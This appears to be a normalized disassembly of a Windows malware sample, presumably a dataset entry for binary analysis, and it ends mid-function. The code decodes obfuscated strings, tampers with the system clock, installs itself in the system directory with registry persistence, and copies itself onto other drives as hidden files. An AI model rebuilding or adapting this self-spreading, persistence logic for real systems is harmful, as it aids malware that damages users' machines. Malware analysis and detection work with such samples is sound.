sub_401000
push ebp
mov ebp esp
sub esp 0x128
push esi
mov esi [ GetSystemTime@IAT ]
push rw-data
call esi
push rw-data
call esi
push 0x0
push 0x2
call CreateToolhelp32Snapshot
mov esi eax
cmp esi 0xffffffff
je r-xdata
pop esi
leave
retn
lea eax [ ebp - 0x128 ]
mov [ ebp - 0x128 ] 0x128
push eax
push esi
call Process32First
push esi
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x104 ]
push eax
call [ CharUpperA@IAT ]
lea eax [ ebp - 0x104 ]
push rw-data
push eax
call strcmp
pop ecx
test eax eax
pop ecx
jne r-xdata
lea eax [ ebp - 0x128 ]
push eax
push esi
call Process32Next
jmp r-xdata
mov [ rw-data ] 0x1
test eax eax
je r-xdata
sub_401090
call sub_401000
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push rw-data
mov [ rw-data ] 0x7c9
mov [ rw-data ] 0x3
mov [ rw-data ] 0xd
call [ SetSystemTime@IAT ]
push 0x3e8
call [ Sleep@IAT ]
push 0x1
pop eax
retn
sub_4010d6
mov eax sub_40adfc
call _EH_prolog
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
call sub_401090
mov [ rw-data ] eax
call sub_401157
test eax eax
je r-xdata
push 0x1
pop eax
cmp [ rw-data ] 0x0
je r-xdata
call sub_4017a9
push rw-data
call [ SetSystemTime@IAT ]
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x10
sub_401135
xor ecx ecx
cmp [ esp + 0x8 ] ecx
jle r-xdata
retn
mov eax [ esp + 0x4 ]
add eax ecx
mov dl [ eax ]
sub dl cl
xor dl 0x13
sub dl 0x17
inc ecx
cmp ecx [ esp + 0x8 ]
mov [ eax ] dl
jl r-xdata
sub_401157
sub esp 0x104
push ebx
push esi
push edi
push 0x12
push rw-data
call sub_401135
push 0xd
push rw-data
call sub_401135
push 0x6
push rw-data
call sub_401135
push 0x8
push rw-data
call sub_401135
push 0x7
push rw-data
call sub_401135
push 0xa
push rw-data
call sub_401135
push 0x9
push rw-data
call sub_401135
push 0xc
push rw-data
call sub_401135
add esp 0x40
push 0x11
push rw-data
call sub_401135
push 0x2c
push rw-data
call sub_401135
push 0x19
push rw-data
call sub_401135
push 0x2d
push rw-data
call sub_401135
push 0x10
push rw-data
call sub_401135
push 0xb
push rw-data
call sub_401135
push 0xe
push rw-data
call sub_401135
push 0x11
push rw-data
call sub_401135
add esp 0x40
push 0x13
push rw-data
call sub_401135
push 0x17
push rw-data
call sub_401135
push 0xb
push rw-data
call sub_401135
push 0x3
push rw-data
call sub_401135
mov ebx rw-data
push 0x8
push ebx
call sub_401135
push 0x16
push rw-data
call sub_401135
push 0xc
push rw-data
call sub_401135
push 0x8
push rw-data
call sub_401135
add esp 0x40
push 0x5
push rw-data
call sub_401135
mov esi rw-data
push esi
call strlen
push eax
push esi
call sub_401135
add esp 0x14
mov edi rw-data
push [ edi ]
call strlen
push eax
push [ edi ]
call sub_401135
add edi 0x4
add esp 0xc
cmp edi rw-data
jl r-xdata
mov edi rw-data
push edi
call strlen
push eax
push edi
call sub_401135
add edi 0x10
add esp 0xc
cmp edi rw-data
jl r-xdata
push 0x80
push esi
call [ GetWindowsDirectoryA@IAT ]
call sub_404bae
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push ebp
call sub_402c64
lea eax [ esp + 0x14 ]
push 0x100
push eax
call [ GetSystemDirectoryA@IAT ]
lea eax [ esp + 0x14 ]
mov esi rw-data
push eax
push esi
call strcpy
lea eax [ esp + 0x1c ]
mov edi rw-data
push eax
push edi
call strcpy
lea eax [ esp + 0x24 ]
push eax
push rw-data
call strcpy
mov ebp [ sprintf@IAT ]
push ebx
push esi
push rw-data
push esi
call ebp
push rw-data
push ebx
push edi
push rw-data
push edi
call ebp
push rw-data
mov eax rw-data
push ebx
push eax
push rw-data
push eax
call ebp
add esp 0x50
push esi
call [ DeleteFileA@IAT ]
push esi
call sub_402f01
push edi
call sub_402f01
mov esi rw-data
push rw-data
push esi
call strcpy
push rw-data
push esi
call strcat
push 0x1
call sub_401980
mov esi [ CreateEventA@IAT ]
add esp 0x1c
xor edi edi
push rw-data
push edi
push edi
push edi
call esi
push rw-data
push edi
push edi
push edi
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
call sub_40141a
test eax eax
pop ebp
jne r-xdata
pop edi
pop esi
pop ebx
add esp 0x104
retn
push edi
call sub_401438
pop ecx
call sub_401598
lea eax [ esp + 0xc ]
push eax
push edi
push edi
push r-xdata
push edi
push edi
call [ CreateThread@IAT ]
push 0x1
pop eax
sub_401438
push ebp
mov ebp esp
sub esp 0x288
push ebx
xor ebx ebx
push esi
lea eax [ ebp - 0x4 ]
push ebx
push eax
push ebx
push 0x2001f
push ebx
push rw-data
push ebx
push rw-data
push 0x80000002
mov [ ebp - 0x8 ] 0x80
xor esi esi
call [ RegCreateKeyExA@IAT ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x88 ]
push eax
push ebx
push ebx
push rw-data
push [ ebp - 0x4 ]
call [ RegQueryValueExA@IAT ]
cmp eax ebx
jne r-xdata
push edi
lea eax [ ebp - 0x288 ]
push 0x200
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
lea eax [ ebp - 0x288 ]
push 0x5c
push eax
call [ strrchr@IAT ]
mov esi eax
inc esi
push esi
push rw-data
call strcpy
mov dl [ esi ]
add esp 0x10
xor edi edi
cmp dl bl
je r-xdata
mov al [ ebp - 0x88 ]
push [ ebp - 0x8 ]
lea eax [ ebp - 0x88 ]
mov [ ebp + edi - 0x88 ] bl
push eax
push 0x1
push ebx
push rw-data
push [ ebp - 0x4 ]
call [ RegSetValueExA@IAT ]
pop edi
lea ecx [ ebp - 0x88 ]
mov eax esi
sub ecx esi
cmp [ ebp + 0x8 ] ebx
mov [ esi + rw-data ] bl
je r-xdata
dec al
mov [ esi + rw-data ] al
mov al [ ebp + esi - 0x87 ]
inc esi
jmp r-xdata
inc dl
inc edi
mov [ ecx + eax ] dl
mov dl [ eax + 0x1 ]
inc eax
cmp dl bl
jne r-xdata
pop esi
pop ebx
leave
retn
cmp al bl
je r-xdata
sub_401531
push ebp
mov ebp esp
push ecx
push esi
xor esi esi
lea eax [ ebp - 0x4 ]
push esi
push eax
push esi
push 0x2001f
push esi
push rw-data
push esi
push rw-data
push 0x80000002
call [ RegCreateKeyExA@IAT ]
cmp [ ebp + 0xc ] 0x1
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp - 0x4 ]
call [ RegDeleteValueA@IAT ]
call strlen
pop ecx
push eax
push [ ebp + 0x8 ]
push 0x1
push esi
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call [ RegSetValueExA@IAT ]
jmp r-xdata
leave
retn
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
cmp [ ebp - 0x4 ] esi
pop esi
je r-xdata
sub_401598
push ebp
mov ebp esp
sub esp 0x700
push ebx
push esi
push edi
mov edi rw-data
xor ebx ebx
push edi
push ebx
push 0x1f0001
call [ OpenMutexA@IAT ]
cmp eax ebx
mov esi rw-data
je r-xdata
push edi
push ebx
push ebx
call [ CreateMutexA@IAT ]
mov edi [ GetSystemDirectoryA@IAT ]
lea eax [ ebp - 0x200 ]
push 0x200
push eax
call edi
lea eax [ ebp - 0x200 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x200 ]
push esi
push eax
call strcat
mov esi [ SetFileAttributesA@IAT ]
add esp 0x10
lea eax [ ebp - 0x200 ]
push ebx
push eax
call esi
lea eax [ ebp - 0x200 ]
push eax
call [ DeleteFileA@IAT ]
lea eax [ ebp - 0x700 ]
push 0x400
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
mov [ ebp + eax - 0x700 ] bl
lea eax [ ebp - 0x200 ]
push 0x200
push eax
call edi
lea eax [ ebp - 0x200 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x200 ]
push rw-data
push eax
call strcat
mov edi [ strrchr@IAT ]
lea eax [ ebp - 0x200 ]
push 0x2e
push eax
call edi
mov [ eax ] bl
lea eax [ ebp - 0x700 ]
push 0x2e
push eax
call edi
add esp 0x20
mov [ eax ] bl
lea eax [ ebp - 0x200 ]
push eax
lea eax [ ebp - 0x700 ]
push eax
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
push eax
call [ CloseHandle@IAT ]
push [ rw-data ]
call [ SetEvent@IAT ]
push 0x1388
push [ rw-data ]
call [ WaitForSingleObject@IAT ]
push 0x1f4
call [ Sleep@IAT ]
push ebx
push esi
call sub_401531
pop ecx
pop ecx
push 0x1
push rw-data
call sub_401531
push 0x1
call sub_401438
add esp 0xc
pop edi
pop esi
pop ebx
leave
retn
mov edi rw-data
lea eax [ ebp - 0x700 ]
push edi
push eax
call strcat
pop ecx
lea eax [ ebp - 0x200 ]
pop ecx
push ebx
push eax
call esi
lea eax [ ebp - 0x200 ]
push ebx
push eax
lea eax [ ebp - 0x700 ]
push eax
call [ CopyFileA@IAT ]
lea eax [ ebp - 0x200 ]
push eax
lea eax [ ebp - 0x300 ]
push eax
call strcpy
lea eax [ ebp - 0x300 ]
push edi
push eax
call strcat
add esp 0x10
lea eax [ ebp - 0x300 ]
push ebx
push eax
call esi
lea eax [ ebp - 0x300 ]
push eax
call [ DeleteFileA@IAT ]
lea eax [ ebp - 0x300 ]
push eax
lea eax [ ebp - 0x200 ]
push eax
call [ rename@IAT ]
pop ecx
lea eax [ ebp - 0x200 ]
pop ecx
push eax
call [ GetFileAttributesA@IAT ]
or al 0x6
push eax
lea eax [ ebp - 0x200 ]
push eax
call esi
lea eax [ ebp - 0x200 ]
push eax
call sub_40213b
pop ecx
push 0x1
call [ ExitProcess@IAT ]
sub_4017a9
push ebp
mov ebp esp
push ecx
push esi
push edi
call sub_404c4e
test eax eax
je r-xdata
mov esi [ CreateThread@IAT ]
lea eax [ ebp - 0x4 ]
xor edi edi
push eax
push edi
push edi
push r-xdata
push edi
push edi
call esi
lea eax [ ebp - 0x4 ]
push eax
push edi
push edi
push sub_4017f5
push edi
push edi
call esi
call sub_4022aa
call sub_401903
push 0x3e8
call [ Sleep@IAT ]
jmp r-xdata
sub_4017f5
push ebp
mov ebp esp
sub esp 0x310
push ebx
mov ebx [ toupper@IAT ]
push esi
push edi
push 0x14
call [ Sleep@IAT ]
jmp r-xdata
cmp [ ebp - 0x310 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x310 ]
push eax
push 0x200
call [ GetLogicalDriveStringsA@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
lea esi [ ebp + eax - 0x310 ]
push esi
call strlen
mov edi eax
movsx eax [ esi ]
push eax
inc edi
call ebx
pop ecx
pop ecx
push esi
call [ GetDriveTypeA@IAT ]
mov [ ebp - 0x8 ] eax
movsx eax [ esi ]
push eax
call ebx
cmp eax 0x43
pop ecx
jl r-xdata
add [ ebp - 0x4 ] edi
mov eax [ ebp - 0x4 ]
cmp [ ebp + eax - 0x310 ] 0x0
jne r-xdata
lea eax [ ebp - 0x10 ]
push 0x0
push eax
push 0x0
push esi
call [ GetDiskFreeSpaceExA@IAT ]
cmp [ ebp - 0x8 ] 0x2
je r-xdata
cmp [ ebp - 0xc ] 0x0
ja r-xdata
cmp [ ebp - 0x8 ] 0x3
jne r-xdata
cmp [ ebp - 0x10 ] 0xee6b2800
ja r-xdata
lea eax [ ebp - 0x110 ]
push esi
push eax
call strcpy
lea eax [ ebp - 0x110 ]
push rw-data
push eax
call strcat
add esp 0x10
lea eax [ ebp - 0x110 ]
push eax
call [ PathFileExistsA@IAT ]
test eax eax
jne r-xdata
push esi
call sub_401aae
pop ecx
sub_401903
push ebp
mov ebp esp
sub esp 0x200
push ebx
xor ebx ebx
push ebx
call sub_401980
pop ecx
lea eax [ ebp - 0x200 ]
push eax
push 0x200
call [ GetLogicalDriveStringsA@IAT ]
test eax eax
je r-xdata
pop ebx
leave
retn
cmp [ ebp - 0x200 ] bl
je r-xdata
push esi
push edi
lea esi [ ebp - 0x200 ]
add ebx edi
cmp [ ebp + ebx - 0x200 ] 0x0
lea esi [ ebp + ebx - 0x200 ]
jne r-xdata
push eax
call sub_401a82
test eax eax
pop ecx
je r-xdata
push esi
call strlen
mov edi eax
movsx eax [ esi ]
push eax
inc edi
call [ toupper@IAT ]
pop ecx
cmp eax 0x43
pop ecx
jl r-xdata
pop edi
pop esi
push esi
call sub_401aae
pop ecx
sub_401980
push ebp
mov ebp esp
sub esp 0x210
push ebx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
push edi
mov [ ebp - 0x4 ] ebx
jne r-xdata
lea eax [ ebp - 0x210 ]
push eax
push 0x200
call [ GetLogicalDriveStringsA@IAT ]
test eax eax
je r-xdata
push 0x18
xor eax eax
pop ecx
mov edi rw-data
[ edi ]
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x210 ] 0x0
je r-xdata
pop edi
pop ebx
leave
retn
xor ecx ecx
push esi
lea esi [ ebp - 0x210 ]
add ecx 0x4
cmp ecx 0x60
jl r-xdata
cmp [ ecx + rw-data ] ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x8 ]
cmp [ ebp + eax - 0x210 ] 0x0
mov [ ebp - 0x4 ] eax
lea esi [ ebp + eax - 0x210 ]
jne r-xdata
push esi
call [ GetDriveTypeA@IAT ]
cmp eax 0x2
je r-xdata
cmp [ ecx + rw-data ] ebx
lea eax [ ecx + rw-data ]
je r-xdata
mov [ eax ] ebx
push esi
call strlen
inc eax
mov [ ebp - 0x8 ] eax
movsx eax [ esi ]
push eax
call [ toupper@IAT ]
mov edi eax
pop ecx
cmp edi 0x43
pop ecx
jl r-xdata
pop esi
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp eax 0x3
jne r-xdata
lea ebx [ edi * 4 + rw-data ]
lea eax [ ebp - 0x10 ]
mov [ ebx ] edi
xor edi edi
push edi
push eax
push edi
push esi
call [ GetDiskFreeSpaceExA@IAT ]
cmp [ ebp - 0xc ] edi
ja r-xdata
mov [ edi * 4 + rw-data ] edi
jmp r-xdata
xor ebx ebx
jb r-xdata
and [ ebx ] 0x0
cmp [ ebp - 0x10 ] 0x3b9aca00
jae r-xdata
sub_401a82
mov edx [ esp + 0x4 ]
lea eax [ edx * 4 - 0x104 ]
cmp [ eax + rw-data ] 0x0
lea ecx [ eax + rw-data ]
jne r-xdata
xor eax eax
retn
cmp [ eax + rw-data ] 0x0
je r-xdata
push 0x1
mov [ ecx ] edx
pop eax
retn
sub_401aae
cmp [ rw-data ] 0x0
jne r-xdata
retn
push esi
mov esi [ esp + 0x8 ]
push 0x5c
push esi
mov [ rw-data ] 0x1
call [ strrchr@IAT ]
pop ecx
test eax eax
pop ecx
je r-xdata
push esi
call sub_401aef
push esi
call sub_401cb0
and [ rw-data ] 0x0
pop ecx
pop ecx
pop esi
and [ eax ] 0x0
sub_401aef
push ebp
mov ebp esp
sub esp 0x840
push ebx
push esi
push edi
lea eax [ ebp - 0x440 ]
push [ ebp + 0x8 ]
push eax
call strcpy
lea eax [ ebp - 0x440 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x440 ]
push eax
lea eax [ ebp - 0x640 ]
push eax
call strcpy
lea eax [ ebp - 0x440 ]
push eax
lea eax [ ebp - 0x840 ]
push eax
call strcpy
lea eax [ ebp - 0x440 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x440 ]
push rw-data
push eax
call strcat
mov esi rw-data
lea eax [ ebp - 0x440 ]
push esi
push eax
call strcat
mov ebx rw-data
lea eax [ ebp - 0x640 ]
push ebx
push eax
call strcat
add esp 0x40
lea eax [ ebp - 0x840 ]
push rw-data
push eax
call strcat
mov edi rw-data
lea eax [ ebp - 0x240 ]
push edi
push eax
call strcpy
lea eax [ ebp - 0x240 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x240 ]
push esi
push eax
call strcat
mov esi [ CopyFileA@IAT ]
add esp 0x20
lea eax [ ebp - 0x240 ]
push 0x0
push eax
lea eax [ ebp - 0x440 ]
push eax
call esi
lea eax [ ebp - 0x240 ]
push edi
push eax
call strcpy
lea eax [ ebp - 0x240 ]
push ebx
push eax
call strcat
add esp 0x10
lea eax [ ebp - 0x240 ]
push 0x0
push eax
lea eax [ ebp - 0x640 ]
push eax
call esi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x240 ]
push rw-data
push eax
call [ fopen@IAT ]
mov ebx eax
pop ecx
test ebx ebx
pop ecx
je r-xdata
push ebx
push 0x40
lea eax [ ebp - 0x40 ]
push 0x1
push eax
call [ fread@IAT ]
and [ ebp + eax - 0x40 ] 0x0
push ebx
call [ fclose@IAT ]
lea eax [ ebp - 0x40 ]
push rw-data
push eax
call strcmp
add esp 0x1c
test eax eax
je r-xdata
lea eax [ ebp - 0x240 ]
push edi
push eax
call strcpy
lea eax [ ebp - 0x240 ]
push rw-data
push eax
call strcat
add esp 0x10
lea eax [ ebp - 0x240 ]
push 0x0
push eax
lea eax [ ebp - 0x840 ]
push eax
call esi
test eax eax
je r-xdata
lea eax [ ebp - 0x240 ]
push eax
call sub_40213b
pop ecx
sub_401cb0
push ebp
mov ebp esp
sub esp 0x400
push edi
lea eax [ ebp - 0x200 ]
push [ ebp + 0x8 ]
push eax
call strcpy
lea eax [ ebp - 0x200 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x200 ]
push eax
lea eax [ ebp - 0x400 ]
push eax
call strcpy
lea eax [ ebp - 0x400 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x200 ]
push eax
call sub_402f01
lea eax [ ebp - 0x400 ]
push rw-data
push eax
call [ fopen@IAT ]
mov edi eax
add esp 0x2c
test edi edi
je r-xdata
lea eax [ ebp - 0x400 ]
push eax
call [ GetFileAttributesA@IAT ]
or al 0x6
push eax
lea eax [ ebp - 0x400 ]
push eax
call [ SetFileAttributesA@IAT ]
lea eax [ ebp - 0x200 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x200 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x200 ]
push eax
call sub_402f01
lea eax [ ebp - 0x200 ]
push eax
push rw-data
call sub_401dbd
add esp 0x1c
pop edi
leave
retn
push esi
mov esi [ fwrite@IAT ]
push edi
push 0x1
push 0x11
push rw-data
call esi
push edi
push 0x1
push 0x2
push rw-data
call esi
push edi
push 0x1
push 0x2c
push rw-data
call esi
push edi
call [ fclose@IAT ]
add esp 0x34
pop esi
sub_401dbd
push ebp
mov ebp esp
sub esp 0x94c
push ebx
push esi
mov esi [ sprintf@IAT ]
push edi
push [ ebp + 0x8 ]
lea eax [ ebp - 0x94c ]
push rw-data
push eax
call esi
add esp 0xc
lea eax [ ebp - 0x14c ]
push eax
lea eax [ ebp - 0x94c ]
push eax
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x4 ] eax
je r-xdata
push 0x1
pop eax
mov edi rw-data
xor ebx ebx
lea eax [ ebp - 0x14c ]
push eax
push [ ebp - 0x4 ]
call [ FindNextFileA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x120 ]
push eax
lea eax [ ebp - 0x34c ]
push eax
call strcpy
lea eax [ ebp - 0x34c ]
push eax
lea eax [ ebp - 0x74c ]
push [ ebp + 0x8 ]
push edi
push eax
call esi
lea eax [ ebp - 0x34c ]
push eax
lea eax [ ebp - 0x54c ]
push [ ebp + 0xc ]
push edi
push eax
call esi
add esp 0x28
test [ ebp - 0x14c ] 0x10
je r-xdata
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
jmp r-xdata
push [ ebp + 0xc ]
lea eax [ ebp - 0x24c ]
push eax
call strcpy
lea eax [ ebp - 0x24c ]
push 0x5c
push eax
call [ strchr@IAT ]
add esp 0x10
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x54c ]
push ebx
push eax
call [ CreateDirectoryA@IAT ]
lea eax [ ebp - 0x54c ]
push eax
lea eax [ ebp - 0x74c ]
push eax
call sub_401dbd
pop ecx
test eax eax
pop ecx
je r-xdata
cmp [ ebp - 0x120 ] 0x2e
je r-xdata
push ebx
lea eax [ ebp - 0xc ]
push ebx
push eax
lea eax [ ebp - 0x24c ]
push eax
call [ GetDiskFreeSpaceExA@IAT ]
cmp [ ebp - 0x8 ] ebx
ja r-xdata
mov [ eax + 0x1 ] bl
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
jmp r-xdata
lea eax [ ebp - 0x54c ]
push ebx
push eax
lea eax [ ebp - 0x74c ]
push eax
call [ CopyFileA@IAT ]
cmp [ ebp - 0xc ] 0x4c4b40
jb r-xdata
pop edi
pop esi
pop ebx
leave
retn
xor eax eax
jmp r-xdata
sub_401f1c
push rw-data
call sub_402f01
push 0x5c
push [ esp + 0xc ]
call [ strrchr@IAT ]
add esp 0xc
test eax eax
je r-xdata
push [ esp + 0x4 ]
call sub_401f47
pop ecx
retn
and [ eax ] 0x0
sub_401f47
push ebp
mov ebp esp
sub esp 0xa64
push ebx
push esi
mov esi [ sprintf@IAT ]
push edi
push [ ebp + 0x8 ]
lea eax [ ebp - 0x664 ]
push rw-data
push eax
call esi
add esp 0xc
lea eax [ ebp - 0x164 ]
push eax
lea eax [ ebp - 0x664 ]
push eax
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x4 ] eax
je r-xdata
push rw-data
call sub_402f22
pop ecx
push 0x1
pop eax
mov ebx [ FileTimeToSystemTime@IAT ]
test [ rw-data ] 0x1
jne r-xdata
lea eax [ ebp - 0x138 ]
push eax
lea eax [ ebp - 0x264 ]
push eax
call strcpy
lea eax [ ebp - 0x264 ]
push eax
lea eax [ ebp - 0x464 ]
push [ ebp + 0x8 ]
push rw-data
push eax
call esi
add esp 0x18
test [ ebp - 0x164 ] 0x10
je r-xdata
call [ GetTickCount@IAT ]
mov ecx eax
sub ecx [ rw-data ]
cmp ecx 0x64
jbe r-xdata
or [ rw-data ] 0x1
call [ GetTickCount@IAT ]
mov [ rw-data ] eax
mov edi [ ebp - 0x144 ]
shr edi 0xa
test [ ebp - 0x144 ] 0x3ff
je r-xdata
push 0x64
call [ Sleep@IAT ]
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x160 ]
push eax
call ebx
movzx eax [ ebp - 0xa ]
push eax
movzx eax [ ebp - 0xc ]
push eax
movzx eax [ ebp - 0xe ]
push eax
movzx eax [ ebp - 0x12 ]
push eax
movzx eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x264 ]
push eax
lea eax [ ebp - 0xa64 ]
push rw-data
push eax
call esi
lea eax [ ebp - 0xa64 ]
push eax
call sub_402f22
push rw-data
call sub_402f22
lea eax [ ebp - 0x464 ]
push eax
call sub_401f47
add esp 0x2c
test eax eax
je r-xdata
lea eax [ ebp - 0x164 ]
push eax
push [ ebp - 0x4 ]
call [ FindNextFileA@IAT ]
test eax eax
je r-xdata
push 0xa
mov [ rw-data ] eax
call [ Sleep@IAT ]
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x150 ]
push eax
call ebx
movzx eax [ ebp - 0x1a ]
push eax
movzx eax [ ebp - 0x1c ]
push eax
movzx eax [ ebp - 0x1e ]
push eax
movzx eax [ ebp - 0x22 ]
push eax
movzx eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x264 ]
push edi
push eax
lea eax [ ebp - 0xa64 ]
push rw-data
push eax
call esi
lea eax [ ebp - 0xa64 ]
push eax
call sub_402f22
push rw-data
call sub_402f22
add esp 0x2c
inc edi
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
push rw-data
call sub_402f22
pop ecx
xor eax eax
jmp r-xdata
jmp r-xdata
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp - 0x138 ] 0x2e
je r-xdata
sub_40213b
push ebp
mov ebp esp
sub esp 0x254
push ebx
push esi
push rw-data
push [ ebp + 0x8 ]
call [ strstr@IAT ]
pop ecx
xor ebx ebx
test eax eax
pop ecx
jne r-xdata
push 0x44
lea eax [ ebp - 0x54 ]
push ebx
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x24 ] bx
push eax
lea eax [ ebp - 0x54 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push [ ebp + 0x8 ]
push ebx
call [ CreateProcessA@IAT ]
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
lea eax [ ebp - 0x254 ]
push eax
call strcpy
mov esi [ strchr@IAT ]
lea eax [ ebp - 0x254 ]
push 0x22
push eax
call esi
add esp 0x10
cmp eax ebx
je r-xdata
inc eax
push 0x22
push eax
call esi
pop ecx
cmp eax ebx
pop ecx
je r-xdata
mov [ eax ] bl
lea eax [ ebp - 0x254 ]
push 0x5c
push eax
call [ strrchr@IAT ]
pop ecx
cmp eax ebx
pop ecx
je r-xdata
cmp [ eax - 0x1 ] 0x3a
jne r-xdata
mov [ eax ] bl
mov [ eax + 0x1 ] bl
jmp r-xdata
lea eax [ ebp - 0x253 ]
push eax
call [ SetCurrentDirectoryA@IAT ]
sub_4021f6
push ebp
mov ebp esp
sub esp 0x200
push edi
mov edi rw-data
lea eax [ ebp - 0x200 ]
push edi
push eax
call strcpy
lea eax [ ebp - 0x200 ]
push 0x5c
push eax
call [ strrchr@IAT ]
add esp 0x10
test eax eax
je r-xdata
pop edi
leave
retn
and [ eax ] 0x0
push esi
lea eax [ ebp - 0x200 ]
push rw-data
push eax
call strcat
mov esi [ DeleteFileA@IAT ]
pop ecx
pop ecx
push edi
call esi
lea eax [ ebp - 0x200 ]
push eax
call esi
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
push rw-data
jmp r-xdata
call sub_402f22
pop ecx
call sub_402f5b
call sub_402fc6
call sub_4033d4
call sub_40365e
lea eax [ ebp - 0x200 ]
push eax
push edi
call [ rename@IAT ]
lea eax [ ebp - 0x200 ]
push eax
call sub_4027a1
add esp 0xc
lea eax [ ebp - 0x200 ]
push eax
call esi
pop esi
sub_4022aa
push ebp
mov ebp esp
sub esp 0x404
push esi
mov esi rw-data
lea eax [ ebp - 0x204 ]
push esi
push eax
call strcpy
lea eax [ ebp - 0x204 ]
push 0x5c
push eax
call [ strrchr@IAT ]
add esp 0x10
test eax eax
je r-xdata
pop esi
leave
retn
and [ eax ] 0x0
push ebx
lea eax [ ebp - 0x204 ]
push rw-data
push eax
lea eax [ ebp - 0x204 ]
push rw-data
push eax
call [ sprintf@IAT ]
mov ebx [ DeleteFileA@IAT ]
add esp 0x10
push esi
call ebx
lea eax [ ebp - 0x204 ]
push eax
call ebx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x404 ]
push eax
push 0x200
call [ GetLogicalDriveStringsA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x204 ]
push eax
push esi
call [ rename@IAT ]
lea eax [ ebp - 0x204 ]
push eax
call sub_4027a1
add esp 0xc
lea eax [ ebp - 0x204 ]
push eax
call ebx
pop ebx
cmp [ ebp - 0x404 ] 0x0
je r-xdata
push edi
add [ ebp - 0x4 ] edi
mov eax [ ebp - 0x4 ]
cmp [ ebp + eax - 0x404 ] 0x0
jne r-xdata
push esi
call [ GetDriveTypeA@IAT ]
cmp eax 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
lea esi [ ebp + eax - 0x404 ]
push esi
call strlen
mov edi eax
movsx eax [ esi ]
push eax
inc edi
call [ toupper@IAT ]
pop ecx
cmp eax 0x43
pop ecx
jl r-xdata
mov esi rw-data
pop edi
push esi
call sub_402f22
mov [ esp ] rw-data
call sub_402f22
push esi
call sub_401f1c
pop ecx
pop ecx
sub_4023c5
push ebx
push esi
push edi
push 0x2e
push [ esp + 0x14 ]
call [ strrchr@IAT ]
mov edi [ lstrcmpiA@IAT ]
pop ecx
pop ecx
mov ebx eax
mov esi rw-data
xor eax eax
test ebx ebx
je r-xdata
push rw-data
push esi
lea eax [ esi + 0x2 ]
push eax
lea eax [ ebx + 0x1 ]
push eax
jmp r-xdata
push 0x1
pop eax
jmp r-xdata
add esi 0x10
cmp esi rw-data
jl r-xdata
call edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
sub_402418
push ebp
mov ebp esp
sub esp 0x550
push edi
xor edi edi
push edi
call [ CoInitialize@IAT ]
lea eax [ ebp - 0x4 ]
push eax
push r--data
push 0x1
push edi
push r--data
call [ CoCreateInstance@IAT ]
test eax eax
jl r-xdata
pop edi
leave
retn
mov eax [ ebp - 0x4 ]
lea edx [ ebp - 0x8 ]
push edx
push r--data
mov ecx [ eax ]
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
push esi
mov esi 0x104
lea eax [ ebp - 0x550 ]
push esi
push eax
push 0xffffffff
push [ ebp + 0x8 ]
push edi
push edi
call [ MultiByteToWideChar@IAT ]
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x550 ]
push edi
push edx
mov ecx [ eax ]
push eax
call [ ecx + 0x14 ]
cmp eax edi
jl r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
mov eax [ ebp - 0x4 ]
lea edx [ ebp - 0x148 ]
push 0x2
push edx
mov ecx [ eax ]
